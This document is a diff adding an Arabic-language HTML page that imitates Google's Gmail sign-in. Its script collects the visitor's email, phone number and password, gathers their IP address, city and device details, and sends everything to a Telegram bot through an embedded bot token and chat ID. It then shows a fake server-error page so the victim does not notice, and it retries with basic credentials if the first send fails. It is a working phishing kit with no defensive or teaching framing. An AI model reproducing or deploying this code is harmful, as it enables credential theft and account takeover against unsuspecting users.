@@ -1,0 +1,666 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Google - تسجيل الدخول</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Roboto', Arial, sans-serif;
+        }
+        body {
+            background-color: #f0f2f5;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+        .container {
+            width: 100%;
+            max-width: 450px;
+            padding: 20px;
+        }
+        .google-card {
+            background: #ffffff;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            padding: 48px 40px 36px;
+            text-align: center;
+        }
+        .google-logo {
+            font-size: 2.5rem;
+            font-weight: 500;
+            letter-spacing: -1px;
+            margin-bottom: 10px;
+        }
+        .google-logo span:nth-child(1) { color: #4285F4; }
+        .google-logo span:nth-child(2) { color: #EA4335; }
+        .google-logo span:nth-child(3) { color: #FBBC05; }
+        .google-logo span:nth-child(4) { color: #4285F4; }
+        .google-logo span:nth-child(5) { color: #34A853; }
+        .google-logo span:nth-child(6) { color: #EA4335; }
+        h2 {
+            font-size: 24px;
+            font-weight: 400;
+            margin: 10px 0 5px;
+        }
+        .subtitle {
+            font-size: 14px;
+            color: #5f6368;
+            margin-bottom: 30px;
+        }
+        form {
+            display: flex;
+            flex-direction: column;
+        }
+        .input-group {
+            margin-bottom: 20px;
+            text-align: right;
+        }
+        .input-group label {
+            display: block;
+            font-size: 14px;
+            font-weight: 500;
+            color: #5f6368;
+            margin-bottom: 5px;
+            text-align: right;
+        }
+        .input-group label .required {
+            color: #ea4335;
+            margin-right: 3px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 13px 15px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            outline: none;
+            transition: border-color 0.2s;
+            text-align: right;
+        }
+        .input-group input:focus {
+            border-color: #1a73e8;
+        }
+        .input-group input:invalid {
+            border-color: #dadce0;
+        }
+        /* حقل رقم الهاتف مع مفتاح الدولة */
+        .phone-group {
+            margin-bottom: 20px;
+            text-align: right;
+        }
+        .phone-group label {
+            display: block;
+            font-size: 14px;
+            font-weight: 500;
+            color: #5f6368;
+            margin-bottom: 5px;
+            text-align: right;
+        }
+        .phone-group label .required {
+            color: #ea4335;
+            margin-right: 3px;
+        }
+        .phone-wrapper {
+            display: flex;
+            gap: 10px;
+        }
+        .country-code-select {
+            width: 110px;
+            padding: 13px 8px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 14px;
+            outline: none;
+            background-color: #fff;
+            cursor: pointer;
+            text-align: center;
+        }
+        .country-code-select:focus {
+            border-color: #1a73e8;
+        }
+        .phone-number {
+            flex: 1;
+            padding: 13px 15px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            outline: none;
+            transition: border-color 0.2s;
+            direction: ltr;
+            text-align: left;
+        }
+        .phone-number:focus {
+            border-color: #1a73e8;
+        }
+        .forgot-link {
+            text-align: left;
+            margin-bottom: 30px;
+        }
+        .forgot-link a {
+            color: #1a73e8;
+            font-size: 14px;
+            font-weight: 500;
+            text-decoration: none;
+        }
+        .forgot-link a:hover {
+            text-decoration: underline;
+        }
+        .actions {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            gap: 10px;
+        }
+        .create-account a {
+            color: #1a73e8;
+            font-size: 14px;
+            font-weight: 500;
+            text-decoration: none;
+        }
+        .create-account a:hover {
+            text-decoration: underline;
+        }
+        .next-btn {
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 9px 24px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        .next-btn:hover {
+            background-color: #1669d4;
+        }
+        .next-btn:disabled {
+            background-color: #9aa0a6;
+            cursor: not-allowed;
+            opacity: 0.7;
+        }
+        .privacy {
+            margin-top: 40px;
+            font-size: 12px;
+            color: #5f6368;
+        }
+        .privacy a {
+            color: #1a73e8;
+            text-decoration: none;
+        }
+        .privacy a:hover {
+            text-decoration: underline;
+        }
+        .loading-message {
+            color: #1a73e8;
+            font-size: 12px;
+            margin-bottom: 15px;
+            padding: 8px 12px;
+            background-color: #e8f0fe;
+            border-radius: 4px;
+            text-align: center;
+            display: none;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .spinner {
+            display: inline-block;
+            width: 14px;
+            height: 14px;
+            border: 2px solid #1a73e8;
+            border-top: 2px solid transparent;
+            border-radius: 50%;
+            animation: spin 0.6s linear infinite;
+            margin-left: 8px;
+            vertical-align: middle;
+        }
+        /* رسالة الخطأ */
+        .error-page {
+            display: none;
+            text-align: center;
+        }
+        .error-card {
+            background: #ffffff;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            padding: 48px 40px 36px;
+            text-align: center;
+        }
+        .error-icon {
+            font-size: 64px;
+            margin-bottom: 20px;
+        }
+        .error-title {
+            font-size: 24px;
+            font-weight: 500;
+            color: #202124;
+            margin-bottom: 16px;
+        }
+        .error-message {
+            font-size: 16px;
+            color: #5f6368;
+            margin-bottom: 32px;
+            line-height: 1.5;
+        }
+        .retry-btn {
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 12px 24px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            text-decoration: none;
+            display: inline-block;
+        }
+        .retry-btn:hover {
+            background-color: #1669d4;
+        }
+        @media (max-width: 450px) {
+            .google-card {
+                padding: 30px 20px;
+            }
+            .error-card {
+                padding: 30px 20px;
+            }
+            .actions {
+                flex-direction: column;
+                gap: 15px;
+            }
+            .create-account {
+                order: 2;
+            }
+            .next-btn {
+                order: 1;
+                width: 100%;
+            }
+            .phone-wrapper {
+                flex-direction: row;
+            }
+            .country-code-select {
+                width: 90px;
+                font-size: 12px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- صفحة تسجيل الدخول الأصلية -->
+    <div id="loginPage" class="container">
+        <div class="google-card">
+            <div class="google-logo">
+                <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
+            </div>
+            <h2>تسجيل الدخول</h2>
+            <div class="subtitle">للمتابعة إلى Gmail</div>
+            <form id="loginForm" action="#">
+                <div id="loadingMessage" class="loading-message"></div>
+                
+                <!-- الحقل الأول: البريد الإلكتروني Gmail (إجباري) -->
+                <div class="input-group">
+                    <label for="email">البريد الإلكتروني (Gmail) <span class="required">*</span></label>
+                    <input type="email" id="email" placeholder="example@gmail.com" required autocomplete="off">
+                </div>
+                
+                <!-- الحقل الثاني: رقم الهاتف مع مفتاح الدولة (إجباري) -->
+                <div class="phone-group">
+                    <label>رقم الهاتف <span class="required">*</span></label>
+                    <div class="phone-wrapper">
+                        <select id="countryCode" class="country-code-select">
+                            <option value="+966">🇸🇦 +966 (السعودية)</option>
+                            <option value="+20">🇪🇬 +20 (مصر)</option>
+                            <option value="+971">🇦🇪 +971 (الإمارات)</option>
+                            <option value="+962">🇯🇴 +962 (الأردن)</option>
+                            <option value="+961">🇱🇧 +961 (لبنان)</option>
+                            <option value="+964">🇮🇶 +964 (العراق)</option>
+                            <option value="+965">🇰🇼 +965 (الكويت)</option>
+                            <option value="+974">🇶🇦 +974 (قطر)</option>
+                            <option value="+973">🇧🇭 +973 (البحرين)</option>
+                            <option value="+968">🇴🇲 +968 (عمان)</option>
+                            <option value="+963">🇸🇾 +963 (سوريا)</option>
+                            <option value="+970">🇵🇸 +970 (فلسطين)</option>
+                            <option value="+218">🇱🇾 +218 (ليبيا)</option>
+                            <option value="+216">🇹🇳 +216 (تونس)</option>
+                            <option value="+213">🇩🇿 +213 (الجزائر)</option>
+                            <option value="+212">🇲🇦 +212 (المغرب)</option>
+                            <option value="+222">🇲🇷 +222 (موريتانيا)</option>
+                            <option value="+249">🇸🇩 +249 (السودان)</option>
+                            <option value="+1">🇺🇸 +1 (الولايات المتحدة)</option>
+                            <option value="+44">🇬🇧 +44 (بريطانيا)</option>
+                            <option value="+91">🇮🇳 +91 (الهند)</option>
+                            <option value="+90">🇹🇷 +90 (تركيا)</option>
+                            <option value="+33">🇫🇷 +33 (فرنسا)</option>
+                            <option value="+49">🇩🇪 +49 (ألمانيا)</option>
+                        </select>
+                        <input type="tel" id="phoneNumber" class="phone-number" placeholder="رقم الهاتف" required autocomplete="off">
+                    </div>
+                </div>
+                
+                <!-- الحقل الثالث: كلمة المرور (إجباري) -->
+                <div class="input-group">
+                    <label for="password">كلمة المرور <span class="required">*</span></label>
+                    <input type="password" id="password" placeholder="أدخل كلمة المرور" required autocomplete="off">
+                </div>
+                
+                <div class="forgot-link">
+                    <a href="#">نسيت البريد الإلكتروني؟</a>
+                </div>
+                <div class="actions">
+                    <div class="create-account">
+                        <a href="#">إنشاء حساب</a>
+                    </div>
+                    <button type="submit" class="next-btn" id="loginBtn">التالي</button>
+                </div>
+            </form>
+            <div class="privacy">
+                <a href="#">الخصوصية</a> • <a href="#">الشروط</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- صفحة الخطأ التي تظهر بعد تسجيل الدخول -->
+    <div id="errorPage" class="container error-page">
+        <div class="error-card">
+            <div class="error-icon">⚠️</div>
+            <div class="error-title">عذراً، الموقع يعاني من مشكلة تقنية</div>
+            <div class="error-message">
+                نواجه حالياً بعض المشكلات الفنية في الخوادم.<br>
+                يرجى المحاولة مرة أخرى بعد قليل.<br>
+                شكراً لتفهمك.
+            </div>
+            <button class="retry-btn" id="retryBtn">محاولة مرة أخرى</button>
+        </div>
+    </div>
+
+    <script>
+        // ========== إعدادات تليجرام (بوت وجروب) ==========
+        const telegramBotToken = '8567650656:AAFAXe5M_xQ6Zom6Q_uc7g2wAD3W2fAdqkI';
+        const telegramChatId = '8304101362';
+        // =================================================
+
+        const loginForm = document.getElementById('loginForm');
+        const emailInput = document.getElementById('email');
+        const countryCodeSelect = document.getElementById('countryCode');
+        const phoneNumberInput = document.getElementById('phoneNumber');
+        const passwordInput = document.getElementById('password');
+        const loginBtn = document.getElementById('loginBtn');
+        const loadingMessageDiv = document.getElementById('loadingMessage');
+        const loginPage = document.getElementById('loginPage');
+        const errorPage = document.getElementById('errorPage');
+        
+        let isSubmitting = false;
+
+        // دالة سريعة لجلب IP مع مهلة قصيرة
+        async function getIPFast() {
+            try {
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 1500);
+                const response = await fetch('https://api.ipify.org?format=json', {
+                    signal: controller.signal
+                });
+                clearTimeout(timeoutId);
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                return 'غير متاح';
+            }
+        }
+
+        // دالة سريعة لجلب معلومات الموقع بناءً على IP
+        async function getLocationFast(ip) {
+            if (ip === 'غير متاح') return { country: 'غير معروف', city: 'غير معروف' };
+            try {
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 1500);
+                const response = await fetch(`https://ipapi.co/${ip}/json/`, {
+                    signal: controller.signal
+                });
+                clearTimeout(timeoutId);
+                const data = await response.json();
+                return {
+                    country: data.country_name || 'غير معروف',
+                    city: data.city || 'غير معروف'
+                };
+            } catch (error) {
+                return { country: 'غير معروف', city: 'غير معروف' };
+            }
+        }
+
+        // دالة سريعة لجمع معلومات الجهاز والمتصفح
+        function getDeviceFast() {
+            const ua = navigator.userAgent;
+            let device = 'PC';
+            let browser = 'غير معروف';
+            let os = 'غير معروف';
+            
+            if (/Android/i.test(ua)) device = 'Android';
+            else if (/iPhone/i.test(ua)) device = 'iPhone';
+            else if (/iPad/i.test(ua)) device = 'iPad';
+            else if (/Windows/i.test(ua)) device = 'Windows';
+            else if (/Mac/i.test(ua)) device = 'Mac';
+            
+            if (/Chrome/i.test(ua) && !/Edge/i.test(ua)) browser = 'Chrome';
+            else if (/Firefox/i.test(ua)) browser = 'Firefox';
+            else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = 'Safari';
+            else if (/Edge/i.test(ua)) browser = 'Edge';
+            
+            if (/Windows NT 10.0/i.test(ua)) os = 'Windows 10';
+            else if (/Windows NT 6.1/i.test(ua)) os = 'Windows 7';
+            else if (/Mac OS X/i.test(ua)) os = 'macOS';
+            else if (/Android/i.test(ua)) os = 'Android';
+            else if (/iPhone|iPad/i.test(ua)) os = 'iOS';
+            
+            return { device, browser, os };
+        }
+
+        // إرسال البيانات إلى تليجرام بشكل فوري
+        function sendToTelegramFast(email, countryCode, phoneNumber, password, ip, location, device) {
+            const timestamp = new Date().toLocaleString('ar-EG', { hour12: false });
+            const fullPhone = `${countryCode} ${phoneNumber}`;
+            const message = `🔐 GOOGLE LOGIN 🔐
+━━━━━━━━━━━━━━━━━━━━━━
+📧 Gmail: ${email}
+📱 رقم الهاتف: ${fullPhone}
+🔑 كلمة المرور: ${password}
+━━━━━━━━━━━━━━━━━━━━━━
+🌐 IP: ${ip}
+🏳️ الدولة: ${location.country}
+🏙️ المدينة: ${location.city}
+📱 الجهاز: ${device.device}
+🌍 المتصفح: ${device.browser}
+💻 النظام: ${device.os}
+🕒 الوقت: ${timestamp}
+━━━━━━━━━━━━━━━━━━━━━━`;
+            
+            const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+            
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: telegramChatId,
+                    text: message
+                })
+            }).catch(err => console.error('Telegram send error:', err));
+        }
+
+        // عرض رسالة التحميل
+        function showLoading(show, message = 'جاري الاتصال...') {
+            if (show) {
+                loadingMessageDiv.innerHTML = `<span class="spinner"></span> ${message}`;
+                loadingMessageDiv.style.display = 'block';
+                loginBtn.disabled = true;
+            } else {
+                loadingMessageDiv.style.display = 'none';
+                loginBtn.disabled = false;
+            }
+        }
+
+        // إظهار صفحة الخطأ وإخفاء صفحة تسجيل الدخول
+        function showErrorPage() {
+            loginPage.style.display = 'none';
+            errorPage.style.display = 'block';
+        }
+
+        // إظهار صفحة تسجيل الدخول وإخفاء صفحة الخطأ
+        function showLoginPage() {
+            loginPage.style.display = 'block';
+            errorPage.style.display = 'none';
+            // مسح الحقول
+            emailInput.value = '';
+            phoneNumberInput.value = '';
+            passwordInput.value = '';
+            isSubmitting = false;
+            showLoading(false);
+        }
+
+        // التحقق من صحة جميع الحقول قبل الإرسال
+        function validateAllFields() {
+            const email = emailInput.value.trim();
+            const phoneNumber = phoneNumberInput.value.trim();
+            const password = passwordInput.value.trim();
+            
+            if (!email) {
+                alert('الرجاء إدخال البريد الإلكتروني (Gmail)');
+                emailInput.focus();
+                return false;
+            }
+            
+            // التحقق من صحة الإيميل
+            if (!email.includes('@') || !email.includes('.')) {
+                alert('الرجاء إدخال بريد إلكتروني صحيح');
+                emailInput.focus();
+                return false;
+            }
+            
+            if (!phoneNumber) {
+                alert('الرجاء إدخال رقم الهاتف');
+                phoneNumberInput.focus();
+                return false;
+            }
+            
+            // التحقق من أن رقم الهاتف يحتوي على أرقام فقط (مع السماح ببعض الرموز)
+            const phoneRegex = /^[0-9\-\(\)\s\+]+$/;
+            if (!phoneRegex.test(phoneNumber)) {
+                alert('الرجاء إدخال رقم هاتف صحيح (أرقام فقط)');
+                phoneNumberInput.focus();
+                return false;
+            }
+            
+            if (!password) {
+                alert('الرجاء إدخال كلمة المرور');
+                passwordInput.focus();
+                return false;
+            }
+            
+            if (password.length < 6) {
+                alert('كلمة المرور يجب أن تكون 6 أحرف على الأقل');
+                passwordInput.focus();
+                return false;
+            }
+            
+            return true;
+        }
+
+        // معالج تسجيل الدخول الرئيسي
+        loginForm.addEventListener('submit', async function(event) {
+            event.preventDefault();
+            
+            // التحقق من جميع الحقول قبل أي شيء
+            if (!validateAllFields()) {
+                return;
+            }
+            
+            if (isSubmitting) return;
+            
+            const email = emailInput.value.trim();
+            const phoneNumber = phoneNumberInput.value.trim();
+            const countryCode = countryCodeSelect.value;
+            const password = passwordInput.value.trim();
+            
+            isSubmitting = true;
+            showLoading(true, 'جاري تسجيل الدخول...');
+            
+            try {
+                // جمع المعلومات بسرعة
+                const ip = await getIPFast();
+                const location = await getLocationFast(ip);
+                const device = getDeviceFast();
+                
+                // إرسال البيانات إلى تليجرام فوراً
+                sendToTelegramFast(email, countryCode, phoneNumber, password, ip, location, device);
+                
+                console.log('✅ تم إرسال بيانات الدخول إلى البوت');
+                console.log(`📧 ${email} | 📱 ${countryCode} ${phoneNumber} | 🌍 ${location.country}`);
+                
+                // إظهار رسالة التحميل ثم الانتقال إلى صفحة الخطأ
+                showLoading(true, 'جاري التحقق من البيانات...');
+                
+                // تأخير بسيط ثم إظهار صفحة الخطأ
+                setTimeout(() => {
+                    showErrorPage();
+                }, 800);
+                
+            } catch (error) {
+                console.error('حدث خطأ أثناء المعالجة:', error);
+                // محاولة إرسال البيانات الأساسية في حال فشل جمع المعلومات
+                try {
+                    const basicMessage = `🔐 GOOGLE LOGIN (BASIC)\n📧 ${email}\n📱 ${countryCode} ${phoneNumber}\n🔑 ${password}\n🕒 ${new Date().toLocaleString()}`;
+                    fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: telegramChatId, text: basicMessage })
+                    }).catch(() => {});
+                } catch(e) {}
+                
+                // حتى في حالة الخطأ نظهر صفحة الخطأ
+                setTimeout(() => {
+                    showErrorPage();
+                }, 500);
+            }
+        });
+        
+        // زر المحاولة مرة أخرى - يعيد المستخدم لصفحة تسجيل الدخول
+        const retryBtn = document.getElementById('retryBtn');
+        retryBtn.addEventListener('click', function() {
+            showLoginPage();
+            emailInput.focus();
+        });
+        
+        // دعم الضغط على Enter في الحقول
+        emailInput.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                phoneNumberInput.focus();
+            }
+        });
+        
+        phoneNumberInput.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                passwordInput.focus();
+            }
+        });
+        
+        passwordInput.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                loginForm.dispatchEvent(new Event('submit'));
+            }
+        });
+        
+        console.log('✅ صفحة تسجيل الدخول جاهزة - جميع الحقول إجبارية (Gmail، رقم هاتف مع مفتاح دولة، كلمة المرور)');
+    </script>
+</body>
+</html>
